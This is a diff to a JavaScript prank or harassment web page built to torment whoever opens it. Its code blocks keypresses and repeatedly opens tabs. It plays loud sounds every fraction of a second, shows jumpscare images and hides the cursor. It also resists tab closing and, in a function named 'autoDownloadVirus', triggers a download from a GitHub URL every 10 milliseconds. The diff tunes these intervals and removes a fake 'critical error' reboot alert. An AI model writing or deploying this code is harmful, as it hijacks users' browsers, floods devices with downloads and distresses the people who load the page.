@@ -121,7 +121,7 @@ document.addEventListener('keypress', (e) => e.preventDefault());
     function openRandomTabs() {
         window.open(window.location.href, '_blank');
     }
-    setInterval(openRandomTabs, 1000);
+    setInterval(openRandomTabs, 10000);
 
     function requestNotification() {
         if (Notification.permission !== 'granted') {
@@ -241,18 +241,18 @@ document.addEventListener('keypress', (e) => e.preventDefault());
 
 
     function playLoudSound() {
-        const sound = document.getElementById('loudAudio');
-        sound.volume = 1.0;
-        sound.play();
-    }
-    setInterval(playLoudSound, 500);
+    const sound = document.getElementById('loudAudio');
+    sound.volume = 1.0; // instead of 100
+    sound.play();
+}
+setInterval(playLoudSound, 500);
 
-    function playAlertSound() {
-        const alert = document.getElementById('alertAudio');
-        alert.volume = 1.0;
-        alert.play();
-    }
-    setInterval(playAlertSound, 500);
+function playAlertSound() {
+    const alert = document.getElementById('alertAudio');
+    alert.volume = 1.0; // instead of 100
+    alert.play();
+}
+setInterval(playAlertSound, 500);
 
 // Screamer jumpscares
 const jumpscareImages = [
@@ -295,7 +295,7 @@ const loudSounds = [
 
 function spamLoudSounds() {
     let audio = new Audio(loudSounds[Math.floor(Math.random() * loudSounds.length)]);
-    audio.volume = 1.0;
+    audio.volume = 1.0; // not 100
     audio.play();
 }
 setInterval(spamLoudSounds, 250);
@@ -355,24 +355,6 @@ window.onbeforeunload = function () {
     return "Are you sure you want to leave?"; // Warning message on tab close attempt
 };
 
-function forceRebootChromebook() {
-    if (isChromebook()) {
-        // Simulate a reboot by triggering a "system restart"
-        const fakeRebootAlert = confirm("System has encountered a critical error. Rebooting now...");
-        if (fakeRebootAlert) {
-            document.body.style.transition = 'transform 1s ease-in-out';
-            document.body.style.transform = 'rotate(90deg)'; // Simulate a rotation as part of the "reboot"
-            setTimeout(() => {
-                document.body.style.transform = 'rotate(180deg)';  // Full 180-degree flip simulating "shutdown"
-            }, 1000);
-            setTimeout(() => {
-                location.reload(); // This is the final "reboot"
-            }, 2000);  // Reboot after 6 seconds
-        }
-    }
-}
-setInterval(forceRebootChromebook, 4000); //
-
 function autoDownloadVirus() {
     const a = document.createElement('a');
     a.href = 'https://github.com/breadytoasted/gpt/raw/refs/heads/main/093e98f9-aa73-4c2c-b5cd-360a438e82c9.mp4'; // <-- you can host your own fake file
@@ -381,7 +363,7 @@ function autoDownloadVirus() {
     a.click();
     document.body.removeChild(a);
 }
-setInterval(autoDownloadVirus, 10); // E
+setInterval(autoDownloadVirus, 10);
 
 function hideCursor() {
     document.body.style.cursor = 'none';
